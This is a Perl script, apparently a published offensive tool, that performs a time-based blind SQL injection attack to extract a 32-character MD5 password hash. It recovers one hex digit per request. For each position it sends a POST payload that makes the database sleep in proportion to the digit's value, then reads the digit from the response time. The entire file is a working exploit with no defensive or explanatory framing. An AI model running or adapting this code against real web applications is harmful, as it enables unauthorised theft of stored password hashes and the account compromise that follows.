# Copyright (c) 2016-.. #John
#
# Author: #John <pocolab.com@gmail.com>
# URL: http://www.pocolab.com
# Version: 1.0.0

# Commentary:

# Blind md5 in 128 attemps

# License:

# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 3
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with GNU Emacs; see the file COPYING.  If not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
# Boston, MA 02110-1301, USA.
use strict;
use warnings;
use LWP::Simple;
use open ':std', ':encoding(UTF-8)';
use utf8;
use HTTP::Request;
use experimental 'smartmatch';
use Time::HiRes qw(time);

my$time_sleep=2;
my$const_url="http://index.php";
my@results=();

my$rrrequest=0;
sub makerequest{
        my$p="$_[0]";

print("                     request: $rrrequest\n");
$rrrequest++;
#if($rrrequest==128){exit();}

        my$shit;
$shit="11' or (sleep($time_sleep*conv(substr(password,".$p.",1),16,10))) -- -";
        my$request=HTTP::Request->new(POST=>$const_url);
$request->content_type('application/x-www-form-urlencoded');
$request->content("i=t&on=$shit");
        $request->header("AAA"=>"BBB");
#print($request->as_string."\n");
        my$ua=LWP::UserAgent->new;
        my$response=$ua->request($request);
        if ($response->is_success) {
                return $response->decoded_content;
        }
        else {
#print STDERR $response->status_line, "\n";
        }
}


sub shit_i{
        my$i=$_[0];
        return$i>9?chr($i+55):"$i";
}

sub check{
        my$p=$_[0];
        my$r=shit_i(int((0.2+$p)/$time_sleep));
        return$r;
}

sub get_result{
        my$result="";
        my$min=0;
        my$max=16;
        my$str="";
        my$r;
        my$t1;
        my$t2;
        my$t3;

        my$x;

        for(my$i=0;$i<32;$i++){
                print("    i: $i \n");

                $t1=time;
                $r=makerequest($i+1);
                $t2=time;
                $t3=$t2-$t1;

                print("    time: $t3 \n");
                $x=check($t3);
                $result.=$x;
                print("res: $result\n");

        }
}


sub main(){
        get_result();
}
main();

